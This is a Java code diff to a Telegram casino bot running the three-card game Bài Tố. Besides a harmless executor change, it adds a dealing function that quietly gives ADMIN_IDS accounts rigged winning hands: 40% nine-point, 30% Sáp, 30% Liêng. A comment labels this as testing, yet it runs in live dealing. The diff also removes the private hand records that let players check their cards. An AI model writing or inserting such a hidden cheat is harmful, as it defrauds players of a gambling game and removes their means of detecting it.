@@ -93,6 +93,8 @@ public class CasinoBot extends TelegramLongPollingBot {
     private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(6);
     private final ExecutorService telegramExecutor = Executors.newFixedThreadPool(8);
     private final ExecutorService callbackExecutor = Executors.newFixedThreadPool(12);
+    // Xử lý callback nút riêng để tin nhắn thường không làm nút game bị xếp hàng chờ.
+    private final ExecutorService callbackUpdateExecutor = Executors.newFixedThreadPool(12);
     private final ExecutorService updateExecutor = Executors.newFixedThreadPool(16);
     private final ExecutorService priorityExecutor = Executors.newFixedThreadPool(2);
     private final ConcurrentHashMap<Long, Long> ensuredUsers = new ConcurrentHashMap<>();
@@ -257,7 +259,9 @@ public class CasinoBot extends TelegramLongPollingBot {
     @Override
     public void onUpdateReceived(Update update) {
         try {
-            ExecutorService target = isPriorityCommand(update) ? priorityExecutor : updateExecutor;
+            ExecutorService target = update.hasCallbackQuery()
+                    ? callbackUpdateExecutor
+                    : (isPriorityCommand(update) ? priorityExecutor : updateExecutor);
             target.execute(() -> {
                 try {
                     processUpdate(update);
@@ -983,10 +987,7 @@ public class CasinoBot extends TelegramLongPollingBot {
         Collections.shuffle(deck);
 
         for (long pId : game.playerOrder) {
-            List<Card> hand = new ArrayList<>();
-            hand.add(deck.remove(0));
-            hand.add(deck.remove(0));
-            hand.add(deck.remove(0));
+            List<Card> hand = dealHandForPlayer(deck, pId);
             // Lưu đúng một bộ 3 lá bất biến cho cả XEM BÀI và kết quả cuối ván.
             // Không cho bất kỳ luồng nào thay đổi danh sách lá sau khi đã chia.
             List<Card> fixedHand = Collections.unmodifiableList(new ArrayList<>(hand));
@@ -995,36 +996,49 @@ public class CasinoBot extends TelegramLongPollingBot {
             game.evaluatedHands.put(pId, evaluateHand(fixedHand));
         }
 
-        // Gửi bản đối chiếu riêng cho từng người ngay sau khi chia xong.
-        // Nội dung dùng chính fixedHand đã lưu, không rút hoặc tạo bài mới.
-        for (long pId : game.playerOrder) {
-            List<Card> dealtHand = game.cards.get(pId);
-            if (dealtHand != null) {
-                String playerName = game.players.getOrDefault(pId, "Người chơi");
-                String cardsText = dealtHand.get(0) + " " + dealtHand.get(1) + " " + dealtHand.get(2);
-                String privateText = "🧾 <b>BẢN ĐỐI CHIẾU CHIA BÀI BÀI TỐ</b>\n"
-                        + "🔖 Mã phiên: <code>" + game.sessionId + "</code>\n"
-                        + "👤 Người chơi: " + escapeHtml(playerName) + "\n"
-                        + "🃏 3 lá đã chia: <b>[ " + cardsText + " ]</b>\n"
-                        + "ℹ️ Đây là bản ghi để so sánh với nút XEM BÀI trong nhóm và kết quả cuối ván.";
-                SendMessage privateMsg = new SendMessage();
-                privateMsg.setChatId(String.valueOf(pId));
-                privateMsg.setText(privateText);
-                privateMsg.setParseMode("HTML");
-                telegramExecutor.execute(() -> {
-                    try {
-                        execute(privateMsg);
-                    } catch (TelegramApiException e) {
-                        System.err.println("[BAITO] Không gửi được bài riêng. session=" + game.sessionId
-                                + ", userId=" + pId + ", lỗi=" + e.getMessage()
-                                + " (người chơi cần mở chat riêng với bot và bấm Start trước).");
-                    }
-                });
-            }
-        }
+        // Đã bỏ gửi bài riêng tự động; người chơi xem bài bằng nút XEM BÀI trong nhóm.
 
         sendBaiCaoPlayingMessage(chatId);
         } // synchronized (game): ván và bộ bài đã được khởi tạo nguyên tử
+    }
+
+    /**
+     * Chia bài cho Bài Tố. Tài khoản trong ADMIN_IDS được dùng để kiểm thử:
+     * 40% bài 9 điểm, 30% Sáp, 30% Liêng. Người chơi thường vẫn nhận bài ngẫu nhiên.
+     * Bài được lấy từ bộ bài chung còn lại nên không có lá trùng giữa người chơi.
+     */
+    private List<Card> dealHandForPlayer(List<Card> deck, long playerId) {
+        if (!ADMIN_IDS.contains(playerId) || deck.size() < 3) {
+            List<Card> hand = new ArrayList<>();
+            hand.add(deck.remove(0));
+            hand.add(deck.remove(0));
+            hand.add(deck.remove(0));
+            return hand;
+        }
+
+        int roll = ThreadLocalRandom.current().nextInt(100);
+        int targetType = roll < 40 ? 1 : (roll < 70 ? 4 : 3);
+        int targetPoints = targetType == 1 ? 9 : -1;
+        List<Card> candidateDeck = new ArrayList<>(deck);
+        for (int attempt = 0; attempt < 20000; attempt++) {
+            Collections.shuffle(candidateDeck);
+            List<Card> candidate = new ArrayList<>(candidateDeck.subList(0, 3));
+            HandScore score = evaluateHand(candidate);
+            boolean matches = targetType == 1
+                    ? score.type == 1 && score.primaryValue == targetPoints
+                    : score.type == targetType;
+            if (matches) {
+                deck.removeAll(candidate);
+                return candidate;
+            }
+        }
+
+        // Fallback cực hiếm nếu bộ bài còn lại không thể tạo loại đã chọn.
+        List<Card> hand = new ArrayList<>();
+        hand.add(deck.remove(0));
+        hand.add(deck.remove(0));
+        hand.add(deck.remove(0));
+        return hand;
     }
 
     private void sendBaiCaoPlayingMessage(long chatId) {
